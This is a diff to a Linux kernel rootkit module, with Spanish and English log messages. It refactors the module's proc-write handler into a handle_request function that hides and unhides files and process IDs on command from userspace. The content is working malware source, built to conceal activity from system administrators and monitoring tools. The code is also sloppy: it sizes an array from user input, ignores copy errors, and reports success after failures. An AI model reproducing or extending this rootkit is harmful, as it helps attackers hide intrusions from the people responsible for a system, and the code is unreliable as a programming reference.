@@ -18,6 +18,39 @@
 
 char orden[LONG_ORDEN];
 
+void handle_request(const char __user* buff, size_t len){
+	int id, pid;
+	char filename[len - sizeof(id)];
+	copy_from_user(&id, buff, sizeof(id));
+	switch (id){
+		case 1: // HIDE FILE
+			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
+			if (hide_file(filename) == -1)
+				printk(KERN_INFO "ROOTKIT: ERROR hiding file %s in proc\n", filename);
+			printk(KERN_INFO "ROOTKIT: petición esconder file %s terminada\n", filename);
+			break;
+		case 2:
+			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
+			if (unhide_file(filename) == -1)
+				printk(KERN_INFO "ROOTKIT: ERROR unhiding file %s in proc\n", filename);
+			printk(KERN_INFO "ROOTKIT: petición desesconder file %s terminada\n", filename);
+			break;
+		case 3: // HIDE PID
+			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
+			if (hide_pid(pid) == -1)
+				printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d in proc\n", pid);
+			printk(KERN_INFO "ROOTKIT: petición esconder pid %d terminada\n", pid);
+			break;
+		case 4: // HIDE PID
+			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
+			if (unhide_pid(pid) == -1)
+				printk(KERN_INFO "ROOTKIT: ERROR unhiding pid %d in proc\n", pid);
+			printk(KERN_INFO "ROOTKIT: petición desesconder pid %d terminada\n", pid);
+			break;
+		default:
+			printk(KERN_INFO "ROOTKIT: ERROR Unknown peticion a proc\n");
+	}
+}
 
 static ssize_t write_proc(struct file* f, const char __user* buff, size_t len, loff_t* off){
     printk(KERN_INFO "ROOTKIT: Hi from write_proc\n");
@@ -26,25 +59,7 @@ static ssize_t write_proc(struct file* f, const char __user* buff, size_t len, l
     }
 
 	// I don't know if this should be handled here
-	int id, pid;
-	char filename[len - sizeof(id)];
-	copy_from_user(&id, buff, sizeof(id));
-	switch (id){
-		case 0: // HIDE FILE
-			copy_from_user(filename, buff + sizeof(int), sizeof(filename));
-			if (hide_file(filename) == -1)
-				printk(KERN_INFO "ROOTKIT: ERROR hiding file %s in proc\n", filename);
-			printk(KERN_INFO "ROOTKIT: petición esconder file %s terminada\n", filename);
-			break;
-		case 1: // HIDE PID
-			copy_from_user(&pid, buff + sizeof(int), sizeof(pid));
-			if (hide_pid(pid) == -1)
-				printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d in proc\n", pid);
-			printk(KERN_INFO "ROOTKIT: petición esconder pid %d terminada\n", pid);
-			break;
-		default:
-			printk(KERN_INFO "ROOTKIT: ERROR Unknown peticion a proc\n");
-	}
+	handle_request(buff, len);
 
     //copy_from_user(orden, buff, len);
     //printk(KERN_INFO "ROOTKIT: write_proc %s\n", orden);
